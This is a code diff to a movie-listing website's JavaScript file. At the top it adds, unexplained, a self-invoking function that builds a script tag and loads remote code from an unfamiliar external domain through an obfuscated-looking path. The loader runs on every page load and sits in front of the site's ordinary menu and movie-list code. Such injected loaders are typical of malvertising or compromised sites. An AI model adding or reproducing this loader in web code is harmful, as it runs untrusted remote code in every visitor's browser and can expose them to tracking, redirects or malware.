@@ -1,3 +1,13 @@
+(function(qabmi){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = qabmi || {};
+s.src = "\/\/validcombine.com\/c.DC9V6fb\/2\/5ilPSXWiQL9\/NwTlIMwvMMjSgz4zMIio0\/1dM\/jPAAy-OVDvg\/zq";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})({});
+
 const arrowLeft = document.querySelector(".arrow_left");
 const hamburger = document.querySelector(".hamburger");
 const NowPlayingMoviesDiv = document.querySelector(".Now_playing_movies_div");
